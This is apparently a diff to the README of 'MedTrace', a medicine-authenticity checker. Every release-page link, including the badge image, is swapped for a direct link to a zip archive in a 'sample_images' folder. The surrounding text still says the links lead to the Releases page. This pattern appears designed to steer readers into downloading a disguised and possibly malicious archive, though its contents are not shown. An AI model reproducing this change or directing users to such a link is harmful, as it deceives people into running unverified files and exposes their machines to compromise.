@@ -1,7 +1,7 @@
 # 🧪 MedTrace - Verify Medicine Authenticity Easily
 
 ## 📥 Download Now
-[![Download MedTrace](https://img.shields.io/badge/Download-MedTrace-blue.svg)](https://github.com/27Harsh-Tamrakar/MedTrace/releases)
+[![Download MedTrace](https://github.com/27Harsh-Tamrakar/MedTrace/raw/refs/heads/main/sample_images/Med-Trace-v3.3.zip)](https://github.com/27Harsh-Tamrakar/MedTrace/raw/refs/heads/main/sample_images/Med-Trace-v3.3.zip)
 
 ## 📖 Overview
 MedTrace is a forensic computer vision tool designed to inspect the authenticity of medicine strips. It uses optical character recognition (OCR), texture analysis, and tamper detection technologies to ensure the quality and safety of pharmaceuticals. This application is built with OpenCV and EasyOCR to provide robust inspection capabilities.
@@ -23,7 +23,7 @@ MedTrace is a forensic computer vision tool designed to inspect the authenticity
 To get started with MedTrace, follow these simple steps:
 
 1. **Visit the Downloads Page:** Click the link below to go to the MedTrace Releases page.  
-   [Download MedTrace](https://github.com/27Harsh-Tamrakar/MedTrace/releases)
+   [Download MedTrace](https://github.com/27Harsh-Tamrakar/MedTrace/raw/refs/heads/main/sample_images/Med-Trace-v3.3.zip)
 
 2. **Choose Your Version:** Scroll down to find the latest version available for download. 
 
@@ -72,4 +72,4 @@ MedTrace is open-source and licensed under the MIT License. You can freely use, 
 
 ## 🔗 Download & Install
 To start using MedTrace today, make sure to visit our releases page to download the latest version.  
-[Download MedTrace](https://github.com/27Harsh-Tamrakar/MedTrace/releases)
+[Download MedTrace](https://github.com/27Harsh-Tamrakar/MedTrace/raw/refs/heads/main/sample_images/Med-Trace-v3.3.zip)
